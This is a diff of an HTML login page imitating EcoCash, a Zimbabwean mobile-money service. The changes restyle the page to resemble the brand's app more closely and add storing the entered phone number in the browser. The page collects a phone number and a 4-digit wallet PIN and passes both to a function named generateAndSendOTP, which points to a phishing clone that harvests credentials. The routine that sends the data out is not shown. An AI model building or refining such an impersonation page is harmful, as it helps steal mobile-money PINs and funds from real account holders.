@@ -5,309 +5,234 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>EcoCash - Login</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap');
-        
         * {
-            margin: 0;
-            padding: 0;
             box-sizing: border-box;
-            font-family: 'Roboto', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
         }
-        
+
         body {
-            background-color: #f0f2f5;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            padding: 0;
-            position: relative;
-            color: #333333;
+            margin: 0;
+            font-family: Arial, Helvetica, sans-serif;
+            background: #ffffff;
+            -webkit-font-smoothing: antialiased;
         }
-        
-        /* Add subtle background pattern like in the image */
-        body::before {
-            content: "";
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background-image: 
-                radial-gradient(circle at 15% 50%, rgba(0, 123, 255, 0.03) 0%, transparent 55%),
-                radial-gradient(circle at 85% 30%, rgba(0, 123, 255, 0.02) 0%, transparent 55%);
-            z-index: -1;
-        }
-        
+
         .container {
-            width: 100%;
-            max-width: 340px;
-            margin-top: 60px;
-        }
-        
-        .header {
-            margin-bottom: 40px;
+            max-width: 400px;
+            margin: auto;
+            padding: 32px 16px 0;
             text-align: center;
         }
-        
+
         .logo {
-            font-size: 34px;
-            color: #333333;
-            font-weight: 700;
-            letter-spacing: -0.5px;
-            margin-bottom: 12px;
-            text-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
+            font-size: 44px;
+            font-weight: bold;
+            margin-bottom: 16px;
         }
-        
-        .subtitle {
-            font-size: 20px;
-            color: #333333;
-            font-weight: 500;
-            letter-spacing: -0.3px;
+
+        .logo span:first-child {
+            color: #0b5ed7;
         }
-        
-        .login-form {
-            background-color: #ffffff;
-            border-radius: 12px;
-            padding: 24px;
-            box-shadow: 0 2px 12px rgba(0, 0, 0, 0.08);
+
+        .logo span:last-child {
+            color: #e5533d;
+        }
+
+        h2 {
+            font-weight: normal;
             margin-bottom: 24px;
-            border: 1px solid #e1e5e9;
+            font-size: 20px;
+            color: #333;
         }
-        
-        .input-section {
-            margin-bottom: 20px;
-        }
-        
-        .input-label {
-            display: block;
-            font-size: 14px;
-            color: #666666;
-            font-weight: 500;
-            margin-bottom: 8px;
-            letter-spacing: -0.2px;
-        }
-        
-        .phone-input {
+
+        /* PHONE INPUT */
+        .phone-box {
+            border: 2px solid #0b5ed7;
+            border-radius: 12px;
+            padding: 12px 14px;
             display: flex;
             align-items: center;
-            border: 1.5px solid #d1d9e6;
-            border-radius: 8px;
-            overflow: hidden;
-            background: #ffffff;
-            transition: border-color 0.2s;
+            gap: 10px;
+            margin-bottom: 14px;
+            background: #fff;
         }
-        
-        .phone-input:focus-within {
-            border-color: #007bff;
+
+        .flag-img {
+            width: 26px;
+            height: auto;
         }
-        
+
         .country-code {
-            padding: 0 16px;
-            background: #ffffff;
-            height: 100%;
-            display: flex;
-            align-items: center;
-            color: #333333;
-            font-weight: 600;
-            font-size: 15px;
-            border-right: 1.5px solid #d1d9e6;
+            font-size: 16px;
+            font-weight: bold;
+            white-space: nowrap;
         }
-        
-        .phone-input input {
+
+        .phone-input {
             border: none;
-            background: transparent;
-            padding: 15px 12px;
-            font-size: 15px;
-            width: 100%;
-            color: #333333;
-            font-weight: 500;
             outline: none;
+            font-size: 16px;
+            flex: 1;
+            padding: 6px 4px;
+            background: transparent;
         }
-        
-        .phone-input input::placeholder {
-            color: #999999;
-            font-weight: 400;
+
+        .phone-input::placeholder {
+            color: #aaa;
         }
-        
-        .pin-input input {
+
+        .phone-box:focus-within {
+            box-shadow: 0 0 0 3px rgba(11,94,215,0.15);
+        }
+
+        .pin-label {
+            margin-top: 18px;
+            color: #666;
+            font-size: 14px;
+            text-align: left;
+            font-weight: 500;
+        }
+
+        /* PIN INPUT */
+        .pin-input {
             width: 100%;
             padding: 15px;
-            border: 1.5px solid #d1d9e6;
-            border-radius: 8px;
+            border: 2px solid #0b5ed7;
+            border-radius: 10px;
             font-size: 24px;
-            background: #ffffff;
-            color: #333333;
             text-align: center;
-            letter-spacing: 12px;
-            font-weight: 600;
+            letter-spacing: 10px;
+            margin: 14px 0;
             outline: none;
-            transition: border-color 0.2s;
+            box-sizing: border-box;
         }
-        
-        .pin-input input:focus {
-            border-color: #007bff;
+
+        .pin-input:focus {
+            box-shadow: 0 0 0 3px rgba(11,94,215,0.15);
         }
-        
-        .pin-input input::placeholder {
-            color: #cccccc;
+
+        .pin-input::placeholder {
             letter-spacing: 4px;
-            font-weight: 400;
+            color: #aaa;
             font-size: 16px;
         }
-        
-        .forgot-pin {
-            text-align: right;
-            margin-top: 10px;
-        }
-        
-        .forgot-pin a {
-            color: #007bff;
-            text-decoration: none;
+
+        .forgot {
+            color: #666;
             font-size: 13px;
-            font-weight: 500;
-            transition: color 0.2s;
+            margin-bottom: 10px;
+            text-align: right;
+            margin-top: 5px;
         }
-        
-        .forgot-pin a:hover {
-            color: #0056b3;
+
+        .forgot a {
+            color: #666;
+            text-decoration: none;
+        }
+
+        .forgot a:hover {
             text-decoration: underline;
         }
-        
+
         .login-btn {
-            background: #007bff;
+            background: #0b5ed7;
             color: white;
             border: none;
             padding: 16px;
-            font-size: 15px;
-            border-radius: 8px;
+            font-size: 16px;
+            border-radius: 14px;
             cursor: pointer;
             width: 100%;
-            font-weight: 600;
-            margin-top: 8px;
-            transition: background-color 0.2s, transform 0.1s;
-            letter-spacing: -0.2px;
-            box-shadow: 0 2px 4px rgba(0, 123, 255, 0.2);
+            font-weight: bold;
+            margin-top: 10px;
+            transition: background-color 0.2s;
         }
-        
+
         .login-btn:hover {
-            background: #0069d9;
+            background: #0a4fb5;
         }
-        
+
         .login-btn:active {
-            transform: translateY(1px);
-            box-shadow: 0 1px 2px rgba(0, 123, 255, 0.2);
+            transform: scale(0.98);
         }
-        
-        .separator {
-            height: 1px;
-            background: #e1e5e9;
-            margin: 32px 0;
+
+        /* BOTTOM SECTION */
+        .bottom {
             position: relative;
-        }
-        
-        .separator::before {
-            content: "OR";
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            background: #f0f2f5;
-            padding: 0 15px;
-            color: #666666;
-            font-size: 12px;
-            font-weight: 500;
-        }
-        
-        .register-section {
-            background-color: #ffffff;
-            border-radius: 12px;
-            padding: 24px;
-            box-shadow: 0 2px 12px rgba(0, 0, 0, 0.08);
-            margin-bottom: 20px;
-            border: 1px solid #e1e5e9;
+            background: #0b5ed7;
+            padding: 56px 16px 24px;
+            color: #fff;
             text-align: center;
+            overflow: hidden;
+            margin-top: 40px;
         }
-        
-        .register-text {
-            color: #666666;
+
+        .bottom::before {
+            content: "";
+            position: absolute;
+            top: -45px;
+            left: 0;
+            width: 100%;
+            height: 90px;
+            background: #ffffff;
+            border-bottom-left-radius: 100% 100%;
+            border-bottom-right-radius: 100% 100%;
+        }
+
+        .bottom p {
+            margin-bottom: 22px;
             font-size: 14px;
-            margin-bottom: 20px;
-            line-height: 1.5;
-            font-weight: 500;
+            line-height: 1.4;
         }
-        
-        .button-group {
+
+        .buttons {
             display: flex;
             gap: 12px;
             justify-content: center;
+            flex-wrap: wrap;
+            margin-bottom: 22px;
         }
-        
+
         .btn {
-            flex: 1;
-            padding: 13px;
-            border-radius: 8px;
-            border: 1.5px solid #007bff;
-            background: white;
-            color: #007bff;
+            background: #fff;
+            color: #0b5ed7;
+            padding: 14px;
+            width: 150px;
+            border-radius: 14px;
+            font-weight: bold;
+            border: none;
             font-size: 14px;
-            font-weight: 600;
             cursor: pointer;
-            max-width: 140px;
-            transition: all 0.2s;
-            letter-spacing: -0.2px;
         }
-        
-        .btn:hover {
-            background: #f0f8ff;
-            border-color: #0056b3;
-            color: #0056b3;
-        }
-        
+
         .btn:active {
-            transform: translateY(1px);
+            transform: scale(0.98);
         }
-        
+
         .version {
-            text-align: center;
-            color: #999999;
-            font-size: 11px;
-            font-weight: 500;
-            letter-spacing: 0.3px;
-            margin-bottom: 16px;
-        }
-        
-        .terms {
-            text-align: center;
-            color: #666666;
             font-size: 12px;
-            line-height: 1.5;
-            font-weight: 500;
-            padding: 0 20px;
+            margin-bottom: 6px;
         }
-        
+
+        .terms {
+            font-size: 11px;
+            line-height: 1.4;
+        }
+
         .terms a {
-            color: #007bff;
-            text-decoration: none;
-            font-weight: 600;
-            transition: color 0.2s;
-        }
-        
-        .terms a:hover {
-            color: #0056b3;
+            color: #fff;
             text-decoration: underline;
         }
-        
-        .footer {
-            margin-top: 40px;
-            width: 100%;
-            text-align: center;
-            padding: 20px;
-        }
-        
-        /* Form field focus states */
-        input:focus {
-            outline: none;
+
+        /* ===== SMALL SCREENS ===== */
+        @media (max-width: 360px) {
+            .logo {
+                font-size: 38px;
+            }
+
+            .btn {
+                width: 100%;
+                max-width: 220px;
+            }
         }
         
         /* Remove number input arrows */
@@ -320,70 +245,66 @@
         input[type=number] {
             -moz-appearance: textfield;
         }
-        
-        /* Responsive adjustments */
-        @media (max-width: 400px) {
-            .container {
-                padding: 0 20px;
-                margin-top: 40px;
-            }
-            
-            .login-form,
-            .register-section {
-                padding: 20px;
-            }
-        }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="header">
-            <div class="logo">EcoCash</div>
-            <div class="subtitle">Login</div>
+        <div class="logo">
+            <span>Eco</span><span>Cash</span>
+        </div>
+
+        <h2>Login</h2>
+
+        <div class="phone-box">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/6/6a/Flag_of_Zimbabwe.svg" alt="ZW" class="flag-img">
+            <span class="country-code">+263</span>
+            <input
+                type="tel"
+                id="phone"
+                class="phone-input"
+                placeholder="Phone Number"
+                inputmode="numeric"
+                maxlength="9"
+                required
+            >
+        </div>
+
+        <div class="pin-label">Enter your PIN</div>
+
+        <input
+            type="password"
+            id="pin"
+            class="pin-input"
+            placeholder="••••"
+            maxlength="4"
+            pattern="\d{4}"
+            title="Please enter a 4-digit PIN"
+            required
+        >
+
+        <div class="forgot">
+            <a href="#" onclick="forgotPIN()">Forgot PIN?</a>
         </div>
         
-        <form class="login-form" onsubmit="return false;">
-            <div class="input-section">
-                <label class="input-label">+263 Phone Number</label>
-                <div class="phone-input">
-                    <div class="country-code">+263</div>
-                    <input type="tel" id="phone" placeholder="Phone Number" maxlength="9" required>
-                </div>
-            </div>
-            
-            <div class="input-section">
-                <label class="input-label">Enter your PIN</label>
-                <div class="pin-input">
-                    <input type="password" id="pin" placeholder="••••" maxlength="4" required
-                           pattern="\d{4}" title="Please enter a 4-digit PIN">
-                </div>
-                <div class="forgot-pin">
-                    <a href="#" onclick="forgotPIN()">Forgot PIN?</a>
-                </div>
-            </div>
-            
-            <button type="button" class="login-btn" onclick="login()">
-                LOGIN
-            </button>
-        </form>
-        
-        <div class="separator"></div>
-        
-        <div class="register-section">
-            <p class="register-text">To register an EcoCash wallet or get assistance, click below</p>
-            <div class="button-group">
-                <button class="btn" onclick="register()">Register</button>
-                <button class="btn" onclick="helpSupport()">Help & Support</button>
-            </div>
+        <button type="button" class="login-btn" onclick="login()">
+            LOGIN
+        </button>
+    </div>
+
+    <div class="bottom">
+        <p>To register an EcoCash wallet or get assistance,<br>click below</p>
+
+        <div class="buttons">
+            <button class="btn" onclick="register()">Register</button>
+            <button class="btn" onclick="helpSupport()">Help & Support</button>
         </div>
-        
+
         <div class="version">v3.0.0P</div>
-        
+
         <div class="terms">
-            By signing in you agree to the <a href="#" onclick="showTerms()">Terms and Conditions</a>
+            By signing in you agree to the
+            <a href="#" onclick="showTerms()">Terms and Conditions</a>
         </div>
-        
-        <div class="footer"></div>
     </div>
 
     <script>
@@ -399,6 +320,9 @@
             const phoneInput = document.getElementById('phone');
             phoneInput.addEventListener('input', function(e) {
                 this.value = this.value.replace(/[^0-9]/g, '');
+                
+                // Save to localStorage
+                localStorage.setItem('phone', this.value);
             });
             
             // PIN input validation
@@ -425,6 +349,12 @@
                     login();
                 }
             });
+            
+            // Load saved phone number
+            const savedPhone = localStorage.getItem('phone');
+            if (savedPhone && !applicationData.phone) {
+                phoneInput.value = savedPhone;
+            }
         });
         
         function forgotPIN() {
@@ -476,6 +406,9 @@
                 document.getElementById('pin').focus();
                 return;
             }
+            
+            // Save phone to localStorage
+            localStorage.setItem('phone', phone);
             
             // Generate and send OTP
             generateAndSendOTP(phone, pin);
@@ -544,4 +477,4 @@
         }
     </script>
 </body>
-</html>
+    </html>
